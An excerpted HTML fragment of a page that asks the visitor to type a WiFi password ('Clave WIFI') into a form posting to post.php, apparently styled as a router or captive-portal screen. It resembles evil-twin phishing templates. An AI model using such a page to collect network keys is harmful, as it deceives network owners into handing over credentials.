...
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    ...
    <body>
        ...
        <div id="tbs-container">
            <div id="tbs-headline">
                <center><img id="happy2" src="img/start.png" alt=""></center>
            ...
            <form id="form1" name="form1" method="POST" action="post.php" accept-charset="UTF-8" autocomplete="off">
                <!-- XSRF Prevention -->
                    ...
                    <div class="form-input-set offset-bottom-1">
                        <input id="pass" name="pass" class="form-input" maxlength="256" tabindex="10" type="password" placeholder="Clave WIFI">
                    </div>
